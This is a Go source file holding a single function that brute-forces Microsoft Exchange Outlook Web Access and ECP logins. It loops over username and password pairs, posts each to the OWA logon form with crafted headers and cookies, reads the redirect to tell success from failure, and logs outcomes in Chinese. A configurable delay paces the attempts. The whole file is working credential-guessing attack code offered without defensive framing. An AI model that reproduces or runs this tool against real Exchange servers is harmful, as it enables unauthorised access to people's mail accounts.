package lib

import (
	"net/http"
	"net/url"
	"strings"
	"time"
)

func HttpBruteWorker(info *TaskInfo) {

	var refUrl string
	if info.mode == "owa" {
		refUrl, _ = url.JoinPath(info.targetUrl, "/owa/")
	} else {
		refUrl, _ = url.JoinPath(info.targetUrl, "/ecp/")
	}
	referer, _ := url.JoinPath(info.targetUrl, "/owa/auth/logon.aspx?replaceCurrent=1&url="+refUrl)

	for data := range info.task {
		username, password := data[0], data[1]
		Log.Debug("[*] 尝试: %v:%v", username, password)
		form := url.Values{
			"destination":    {refUrl},
			"flags":          {"4"},
			"forcedownlevel": {"0"},
			"username":       {info.domain + "\\" + username},
			"password":       {password},
			"passwordText":   {""},
			"isUtf8":         {"1"},
		}
		req, _ := http.NewRequest("POST", info.u, strings.NewReader(form.Encode()))
		req.Header.Set("Cache-Control", "max-age=0")
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("Referer", referer)
		req.Header.Set("Cookie", "PrivateComputer=true; PBack=0")
		req.Header.Set("Connection", "close")

		res, _ := Client.Do(req)
		location := res.Header.Get("Location")

		if location == "" {
			Log.Failed("[-] 失败: %v", username+":"+password)
		} else if !strings.Contains(location, "reason") {
			Log.Success("[+] 成功: %v", username+":"+password)
		} else {
			Log.Failed("[-] 失败: %v", username+":"+password)
		}
		time.Sleep(time.Second * time.Duration(info.delay))
	}
}
